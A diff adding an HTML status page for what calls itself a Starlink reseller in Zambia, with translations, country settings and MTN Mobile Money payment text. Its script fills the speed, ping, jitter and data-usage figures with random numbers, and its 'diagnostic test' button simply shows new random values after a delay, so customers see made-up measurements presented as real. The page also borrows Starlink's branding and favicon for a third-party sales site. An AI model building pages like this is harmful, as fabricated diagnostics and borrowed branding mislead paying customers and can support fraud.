@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Statut du Réseau - Starlink</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="manifest" href="/starlink/manifest.json">
+    <meta name="theme-color" content="#000000">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Starlink">
+    <link rel="apple-touch-icon" sizes="180x180" href="/starlink/icons/icon-192.png">
+    <script src="/starlink/pwa-install.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
+    <style>
+        .card-shadow { box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
+        .package-card { transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
+        .package-card:hover { transform: translateY(-4px); box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15); }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header -->
+    <header class="bg-black text-white shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="/starlink/" class="flex items-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="36" height="36" class="flex-shrink-0"><ellipse cx="100" cy="100" rx="74" ry="55" stroke="white" stroke-width="10" fill="none" transform="rotate(-25 100 100)"/><ellipse cx="100" cy="100" rx="43" ry="33" stroke="white" stroke-width="10" fill="none" transform="rotate(65 100 100)"/><circle cx="100" cy="100" r="12" fill="white"/></svg>
+                <span class="font-bold text-xl sm:text-2xl tracking-widest">STARLINK</span>
+                <span id="header-subtitle" class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur Zambia</span>
+            </a>
+            <div class="flex items-center gap-2 sm:gap-4">
+                <button id="langToggle" onclick="toggleLanguage()" class="flex items-center gap-1 text-xs font-semibold bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-full transition">
+                    <i class="uil uil-globe"></i> <span id="langLabel">EN</span>
+                </button>
+                <nav class="flex gap-2 sm:gap-4">
+                    <a href="/starlink/status.html" class="text-white flex items-center gap-2">
+                        <i class="uil uil-wifi"></i> <span id="nav-status" class="hidden sm:inline">Statut</span>
+                    </a>
+                    <a href="/starlink/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                        <i class="uil uil-shopping-bag"></i> <span id="nav-plans" class="hidden sm:inline">Forfaits</span>
+                    </a>
+                    <a href="/starlink/orders.html" class="text-gray-300 hover:text-white hidden sm:flex items-center gap-2">
+                        <i class="uil uil-list-ul"></i> <span id="nav-orders" class="hidden sm:inline">Commandes</span>
+                    </a>
+                    <div id="auth-nav" class="flex items-center gap-2"></div>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        <div class="pb-28 space-y-6">
+            
+            <div class="relative overflow-hidden bg-white rounded-3xl p-1 card-shadow">
+                <button onclick="window.location.href='/starlink/'" 
+                        class="w-full bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white font-black py-5 rounded-2xl transition-all transform active:scale-95 flex items-center justify-center gap-3 shadow-xl animate-pulse">
+                    <i class="uil uil-shopping-bag text-2xl"></i>
+                    <span id="choose-package-btn" class="text-lg uppercase tracking-wider">Choisissez Votre Forfait</span>
+                </button>
+            </div>
+
+            <div class="bg-gradient-to-br from-gray-800 to-black text-white p-6 sm:p-8 rounded-3xl card-shadow">
+                <div class="flex items-center justify-between mb-4">
+                    <div>
+                        <p id="service-info-label" class="text-blue-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">Informations sur le Service</p>
+                        <h1 id="service-title" class="text-2xl sm:text-3xl font-black mt-2">Starlink</h1>
+                    </div>
+                    <div class="w-16 h-16 sm:w-20 sm:h-20 bg-blue-600 bg-opacity-20 rounded-full flex items-center justify-center">
+                        <i class="uil uil-satellite text-4xl sm:text-5xl text-blue-400"></i>
+                    </div>
+                </div>
+                <p id="service-desc" class="text-gray-400 text-sm">Sélectionnez un forfait pour activer l'internet satellite haut débit.</p>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 sm:gap-4">
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p id="download-label" class="text-gray-600 text-xs font-bold uppercase tracking-widest">Téléchargement</p>
+                        <i class="uil uil-arrow-down text-blue-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="download-speed">--</p>
+                    <p class="text-gray-500 text-xs mt-1">Mbps</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p id="upload-label" class="text-gray-600 text-xs font-bold uppercase tracking-widest">Envoi</p>
+                        <i class="uil uil-arrow-up text-green-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="upload-speed">--</p>
+                    <p class="text-gray-500 text-xs mt-1">Mbps</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">PING</p>
+                        <i class="uil uil-pulse text-orange-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="ping">--</p>
+                    <p class="text-gray-500 text-xs mt-1">ms</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">JITTER</p>
+                        <i class="uil uil-wave text-purple-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="jitter">--</p>
+                    <p class="text-gray-500 text-xs mt-1">ms</p>
+                </div>
+            </div>
+
+            <div class="bg-white rounded-2xl p-6 sm:p-8 card-shadow border border-gray-100">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center gap-2">
+                        <i class="uil uil-database text-blue-600 text-2xl"></i>
+                        <h3 id="data-usage-title" class="text-lg font-bold text-gray-900">Data Usage</h3>
+                    </div>
+                    <span class="text-xs font-semibold text-gray-600 bg-gray-100 px-3 py-1 rounded-full" id="data-percentage">0%</span>
+                </div>
+                
+                <div class="w-full bg-gray-200 rounded-full h-3 mb-3 overflow-hidden">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-full rounded-full transition-all duration-500" id="data-progress" style="width: 0%"></div>
+                </div>
+                
+                <div class="flex justify-between text-xs text-gray-600">
+                    <span id="data-used">0 GB</span>
+                    <span id="data-limit">100 GB</span>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 gap-3">
+                <button onclick="runSpeedTest()" id="diagnostic-btn" class="w-full bg-white border border-gray-200 text-gray-900 font-bold py-3 rounded-xl transition transform active:scale-95 flex items-center justify-center gap-2 card-shadow">
+                    <i class="uil uil-bolt text-blue-600"></i> <span id="diagnostic-text">Lancer le Test de Diagnostic</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-40">
+            <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
+                <a href="/starlink/status.html" class="flex flex-col items-center gap-1 text-blue-600 transition-all">
+                    <i class="uil uil-wifi text-2xl"></i>
+                    <span id="bottom-status" class="text-xs font-semibold">Statut</span>
+                </a>
+                <a href="/starlink/" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                    <i class="uil uil-shopping-bag text-2xl"></i>
+                    <span id="bottom-plans" class="text-xs font-semibold">Forfaits</span>
+                </a>
+                <a href="/starlink/orders.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                    <i class="uil uil-list-ul text-2xl"></i>
+                    <span id="bottom-orders" class="text-xs font-semibold">Commandes</span>
+                </a>
+                <a href="/starlink/settings.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                    <i class="uil uil-setting text-2xl"></i>
+                    <span id="bottom-settings" class="text-xs font-semibold">Paramètres</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black text-gray-400 py-12 mt-12">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <h3 id="footer-brand" class="text-white font-bold mb-4">STARLINK</h3>
+                    <p id="footer-desc" class="text-sm">Authorized reseller of data packages for Starlink services. Fast, reliable and secure payments via MTN Mobile Money.</p>
+                </div>
+                <div>
+                    <h3 id="footer-support-title" class="text-white font-bold mb-4">SUPPORT</h3>
+                    <p class="text-sm">Email: support@starlink.reseller</p>
+                    <p id="footer-support-desc" class="text-sm">Available 24/7 for technical support.</p>
+                </div>
+                <div>
+                    <h3 id="footer-payment-title" class="text-white font-bold mb-4">PAYMENT</h3>
+                    <p id="footer-payment-desc" class="text-sm">Pay securely with MTN Mobile Money. Make sure you have sufficient balance for the selected package.</p>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 pt-8 text-center">
+                <p id="footer-copyright">&copy; 2026 Starlink Reseller Zambia. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Country configurations
+        const COUNTRY_CONFIG = {
+            'CD': { name: 'RDC', lang: 'fr', currency: 'CDF' },
+            'CG': { name: 'Congo', lang: 'fr', currency: 'XAF' },
+            'GA': { name: 'Gabon', lang: 'fr', currency: 'XAF' },
+            'TD': { name: 'Tchad', lang: 'fr', currency: 'XAF' },
+            'NE': { name: 'Niger', lang: 'fr', currency: 'XOF' },
+            'ZM': { name: 'Zambia', lang: 'en', currency: 'ZMW' },
+            'CF': { name: 'Centrafrique', lang: 'fr', currency: 'XAF' },
+            'GQ': { name: 'Guinee Equatoriale', lang: 'fr', currency: 'XAF' },
+            'MG': { name: 'Madagascar', lang: 'fr', currency: 'MGA' },
+            'KE': { name: 'Kenya', lang: 'en', currency: 'KES' },
+            'UG': { name: 'Uganda', lang: 'en', currency: 'UGX' },
+            'TZ': { name: 'Tanzania', lang: 'en', currency: 'TZS' },
+            'RW': { name: 'Rwanda', lang: 'en', currency: 'RWF' },
+            'NG': { name: 'Nigeria', lang: 'en', currency: 'NGN' },
+            'GH': { name: 'Ghana', lang: 'en', currency: 'GHS' },
+            'ZM': { name: 'Zambia', lang: 'en', currency: 'ZMW' },
+            'MW': { name: 'Malawi', lang: 'en', currency: 'MWK' },
+            'ZA': { name: 'South Africa', lang: 'en', currency: 'ZAR' },
+            'BW': { name: 'Botswana', lang: 'en', currency: 'BWP' },
+            'NA': { name: 'Namibia', lang: 'en', currency: 'NAD' },
+            'MZ': { name: 'Mozambique', lang: 'en', currency: 'MZN' },
+            'ZW': { name: 'Zimbabwe', lang: 'en', currency: 'ZWL' },
+            'SC': { name: 'Seychelles', lang: 'en', currency: 'SCR' },
+            'SL': { name: 'Sierra Leone', lang: 'en', currency: 'SLE' },
+            'LR': { name: 'Liberia', lang: 'en', currency: 'LRD' },
+            'MM': { name: 'မြန်မာ', lang: 'my', currency: 'MMK' },
+            'BI': { name: 'Burundi', lang: 'rn', currency: 'BIF' },
+            'LS': { name: 'Lesotho', lang: 'st', currency: 'LSL' }
+        };
+
+        const translations = {
+            fr: {
+                pageTitle: 'Statut du Réseau - Starlink',
+                headerSubtitle: 'Revendeur',
+                navStatus: 'Statut',
+                navPlans: 'Forfaits',
+                navSignup: 'S\'inscrire', navLogout: 'Déconnexion',
+                navOrders: 'Commandes',
+                navSettings: 'Paramètres',
+                choosePackage: 'Choisissez Votre Forfait',
+                serviceInfo: 'Informations sur le Service',
+                serviceDesc: 'Sélectionnez un forfait pour activer l\'internet satellite haut débit.',
+                download: 'Téléchargement',
+                upload: 'Envoi',
+                dataUsage: 'Utilisation des Données',
+                launchDiagnostic: 'Lancer le Test de Diagnostic',
+                analyzing: 'Analyse en cours...',
+                footerDesc: 'Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via MTN Mobile Money.',
+                footerSupport: 'Disponible 24h/24, 7j/7 pour l\'assistance technique.',
+                footerPayment: 'Payez en toute sécurité avec MTN Mobile Money. Assurez-vous d\'avoir un solde suffisant pour le forfait sélectionné.',
+                footerCopyright: '© 2026 Starlink Reseller Zambie. Tous droits réservés.'
+            },
+            en: {
+                pageTitle: 'Network Status - Starlink',
+                headerSubtitle: 'Reseller',
+                navStatus: 'Status',
+                navPlans: 'Packages',
+                navSignup: 'Sign up', navLogout: 'Logout',
+                navOrders: 'Orders',
+                navSettings: 'Settings',
+                choosePackage: 'Choose Your Package',
+                serviceInfo: 'Service Information',
+                serviceDesc: 'Select a package to activate high-speed satellite internet.',
+                download: 'Download',
+                upload: 'Upload',
+                dataUsage: 'Data Usage',
+                launchDiagnostic: 'Launch Diagnostic Test',
+                analyzing: 'Analyzing...',
+                footerDesc: 'Authorized reseller of data packages for Starlink services. Fast, reliable and secure payments via MTN Mobile Money.',
+                footerSupport: 'Available 24/7 for technical support.',
+                footerPayment: 'Pay securely with MTN Mobile Money. Make sure you have sufficient balance for the selected package.',
+                footerCopyright: '© 2026 Starlink Reseller Zambia. All rights reserved.'
+            },
+            my: {
+                pageTitle: 'ကွန်ရက် အခြေအနေ - Starlink',
+                headerSubtitle: 'ပြန်လည်ရောင်းချသူ',
+                navStatus: 'အခြေအနေ',
+                navPlans: 'ပက်ကေ့ဂျ်များ',
+                navSignup: 'စာရင်းသွင်းမည်', navLogout: 'ထွက်မည်',
+                navOrders: 'မှာယူမှုများ',
+                navSettings: 'ဆက်တင်များ',
+                choosePackage: 'သင့်ပက်ကေ့ဂျ်ကို ရွေးချယ်ပါ',
+                serviceInfo: 'ဍန်ဆောင်မှု အချက်အလက်',
+                serviceDesc: 'အမြန်ဆုံး ဂြိုးတုိင် အင်တာနက် အသက်သွင်းရန် ပက်ကေ့ဂျ်တစ်ခုကို ရွေးချယ်ပါ။',
+                download: 'ဒေါင်းလုတ်',
+                upload: 'အပ်လုတ်',
+                dataUsage: 'ဒေတာ အသုံးပြုမှု',
+                launchDiagnostic: 'စမ်းသပ်ချက် စမ်းသပ်မှု စတင်ပါ',
+                analyzing: 'ခွဲခြမ်းစိစစ်နေသည်...',
+                footerDesc: 'Starlink ဍန်ဆောင်မှုများအတွက် ဒေတာပက်ကေ့ဂျ်များ၏ တရားဍင်ပြန်လည်ရောင်းချသူ။ မိုဘိုင်းငွေဖြင့် မြန်ဆုံးခင်မာတွဲ၌ ယုံကြည်ရပြီး လုံခြုံသော ငွေပေးချေမှုများ။',
+                footerSupport: 'နည်းပညာ ပံ့ပိုးမှုအတွက် ၄၄/၇ ရရှိနိုင်ပါသည်။',
+                footerPayment: 'မိုဘိုင်းငွေဖြင့် လုံခြုံစွာ ပေးချေပါ။ ရွေးချယ်ထားသော ပက်ကေ့ဂျ်အတွက် လုံလောက်သော လက်ကျန်ငွေ ရှိကြောင်း သေချာပါစေ။',
+                footerCopyright: '© 2026 Starlink Reseller. မူပိုင်ခွင့်များ အားလုံးရယူထားသည်။'            },
+            rn: {
+                pageTitle: 'Imimerere ya Réseau - Starlink',
+                headerSubtitle: 'Umucuruzi',
+                navStatus: 'Imimerere',
+                navPlans: 'Amafogito',
+                navSignup: 'Iyandikishe', navLogout: 'Gusohoka',
+                navOrders: 'Amasabwa',
+                navSettings: 'Igenamiterere',
+                choosePackage: 'Hitamwo Ifogito Ryanyu',
+                serviceInfo: 'Amakuru y\'ikoreshwa',
+                serviceDesc: 'Hitamwo ifogito kugira mushobore gukoresha internet y\'icuramutsima.',
+                download: 'Gukurura',
+                upload: 'Kohereza',
+                dataUsage: 'Ikoreshwa ry\'amakuru',
+                launchDiagnostic: 'Tangura igenzura',
+                analyzing: 'Biriko birasuzumwa...',
+                footerDesc: 'Umucuruzi wemewe w\'amafogito ya Starlink. Kwishura kw\'ihuta, kwemerwa kandi k\'umutekano biciye kuri Lumitel.',
+                footerSupport: 'Amasaha 24 kuri 24, imisi 7 kuri 7 ku bufasha bwa tekinike.',
+                footerPayment: 'Ishure mu mutekano biciye kuri Lumitel. Murabe mufise amafaranga ahagije ku fogito mwahisemwo.',
+                footerCopyright: '© 2026 Starlink Reseller. Uburenganzira bwose burabitswe.'            },
+            st: {
+                pageTitle: 'Boemo ba Marang-rang - Starlink',
+                headerSubtitle: 'Morekisi',
+                navStatus: 'Boemo',
+                navPlans: 'Lipheo',
+                navSignup: 'Ingodisa', navLogout: 'Tsoa',
+                navOrders: 'Litaelo',
+                navSettings: 'Litlhophiso',
+                choosePackage: 'Khetha Sepheo sa Hao',
+                serviceInfo: 'Tlhahisoleseling ea Tshebeletso',
+                serviceDesc: 'Khetha sepheo ho qala Inthanete ea satellite e potlakileng.',
+                download: 'Khoasolla',
+                upload: 'Romela',
+                dataUsage: 'Tshebediso ea Data',
+                launchDiagnostic: 'Qala Tlhatlhobo',
+                analyzing: 'E a hlahloba...',
+                footerDesc: 'Morekisi ea lumelletsoeng oa lipheo tsa data tsa Starlink. Litefiso tse potlakileng le tse bolokehileng ka EcoCash.',
+                footerSupport: 'E fumaneha 24/7 bakeng sa tsebo ea theknoloji.',
+                footerPayment: 'Lefa ka polokeho ka EcoCash. Netefatsa hore o na le chelete e lekaneng.',
+                footerCopyright: '© 2026 Starlink Reseller. Litokelo tsohle li bolokehile.'
+            }
+        };
+
+        let currentLang = 'en';
+        let detectedCountry = 'CD';
+
+        async function detectCountry() {
+            localStorage.removeItem('starlink_country_data'); // clear old cache key
+            const CACHE_KEY = 'starlink_country_v2';
+            const cached = localStorage.getItem(CACHE_KEY);
+            if (cached) {
+                const data = JSON.parse(cached);
+                if (Date.now() - data.timestamp < 6 * 60 * 60 * 1000) return data;
+            }
+            return { country: 'ZM' };
+        }
+
+        function renderAuthNav(t) {
+            const authNav = document.getElementById('auth-nav');
+            if (!authNav) return;
+            const user = localStorage.getItem('sl_auth_user');
+            if (user) {
+                try {
+                    const u = JSON.parse(user);
+                    authNav.innerHTML = '<span class="text-gray-300 text-sm hidden sm:inline">' + (u.name || u.phone) + '</span>'
+                        + '<button onclick="doLogout()" class="bg-gray-700 hover:bg-gray-600 text-white px-3 py-1.5 rounded-lg text-sm font-semibold transition">' + (t.navLogout || 'Logout') + '</button>';
+                } catch(e) { authNav.innerHTML = ''; }
+            } else {
+                authNav.innerHTML = '<a href="/starlink/register.html" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-lg text-sm font-semibold transition">' + (t.navSignup || 'Sign up') + '</a>';
+            }
+        }
+
+        function doLogout() {
+            localStorage.removeItem('sl_auth_user');
+            window.location.replace('/starlink/login.html');
+        }
+
+        function applyTranslations(lang) {
+            const t = translations[lang] || translations.en;
+            currentLang = lang;
+            const countryName = COUNTRY_CONFIG[detectedCountry]?.name || 'Global';
+            
+            document.getElementById('page-title').textContent = t.pageTitle;
+            document.getElementById('header-subtitle').textContent = t.headerSubtitle + ' ' + countryName;
+            document.getElementById('nav-status').textContent = t.navStatus;
+            document.getElementById('nav-plans').textContent = t.navPlans;
+            document.getElementById('nav-orders').textContent = t.navOrders;
+            renderAuthNav(t);
+            document.getElementById('choose-package-btn').textContent = t.choosePackage;
+            document.getElementById('service-info-label').textContent = t.serviceInfo;
+            document.getElementById('service-title').textContent = 'Starlink ' + countryName;
+            document.getElementById('service-desc').textContent = t.serviceDesc;
+            document.getElementById('download-label').textContent = t.download;
+            document.getElementById('upload-label').textContent = t.upload;
+            document.getElementById('data-usage-title').textContent = t.dataUsage;
+            document.getElementById('diagnostic-text').textContent = t.launchDiagnostic;
+            document.getElementById('bottom-status').textContent = t.navStatus;
+            document.getElementById('bottom-plans').textContent = t.navPlans;
+            document.getElementById('bottom-orders').textContent = t.navOrders;
+            document.getElementById('bottom-settings').textContent = t.navSettings;
+            document.getElementById('footer-brand').textContent = 'STARLINK ' + countryName;
+            document.getElementById('footer-desc').textContent = t.footerDesc;
+            document.getElementById('footer-support-desc').textContent = t.footerSupport;
+            document.getElementById('footer-payment-desc').textContent = t.footerPayment;
+            document.getElementById('footer-copyright').textContent = t.footerCopyright;
+            document.getElementById('langLabel').textContent = lang === 'fr' ? 'FR' : 'EN';
+            document.documentElement.lang = lang;
+        }
+
+        function toggleLanguage() {
+            const newLang = currentLang === 'fr' ? 'en' : currentLang === 'en' ? 'my' : currentLang === 'my' ? 'rn' : 'fr';
+            applyTranslations(newLang);
+            localStorage.setItem('starlink_user_lang', newLang);
+            localStorage.setItem('starlink_lang_country', detectedCountry);
+            if (typeof window.updatePWABannerLang === 'function') window.updatePWABannerLang();
+        }
+
+        function generateNetworkStats() {
+            return {
+                download: (Math.random() * 100 + 100).toFixed(2),
+                upload: (Math.random() * 20 + 20).toFixed(2),
+                ping: Math.floor(Math.random() * 40 + 20),
+                jitter: Math.floor(Math.random() * 8 + 2),
+                dataUsed: (Math.random() * 30 + 20).toFixed(1),
+                dataLimit: 100
+            };
+        }
+
+        function updateNetworkStats() {
+            const stats = generateNetworkStats();
+            document.getElementById('download-speed').textContent = stats.download;
+            document.getElementById('upload-speed').textContent = stats.upload;
+            document.getElementById('ping').textContent = stats.ping;
+            document.getElementById('jitter').textContent = stats.jitter;
+            document.getElementById('data-used').textContent = stats.dataUsed + ' GB';
+            document.getElementById('data-limit').textContent = stats.dataLimit + ' GB';
+            const percentage = (stats.dataUsed / stats.dataLimit * 100).toFixed(0);
+            document.getElementById('data-percentage').textContent = percentage + '%';
+            document.getElementById('data-progress').style.width = percentage + '%';
+        }
+
+        function runSpeedTest() {
+            const button = event.target.closest('button');
+            const t = translations[currentLang];
+            const originalText = button.innerHTML;
+            button.innerHTML = '<i class="uil uil-spinner-alt animate-spin"></i> ' + t.analyzing;
+            button.disabled = true;
+            setTimeout(() => { updateNetworkStats(); button.innerHTML = originalText; button.disabled = false; }, 2500);
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            updateNetworkStats();
+            const countryData = await detectCountry();
+            const urlCountry = new URLSearchParams(window.location.search).get('country');
+            detectedCountry = (urlCountry && COUNTRY_CONFIG[urlCountry.toUpperCase()]) ? urlCountry.toUpperCase() : countryData.country;
+            const config = COUNTRY_CONFIG[detectedCountry] || COUNTRY_CONFIG['CD'];
+            const savedLang = localStorage.getItem('starlink_user_lang');
+            const savedForCountry = localStorage.getItem('starlink_lang_country');
+            // Only use savedLang if it was set while in the same country, else use country default
+            const effectiveLang = (savedLang && savedForCountry === detectedCountry) ? savedLang : config.lang;
+            applyTranslations(effectiveLang);
+        });
+    </script>
+</body>
+</html>
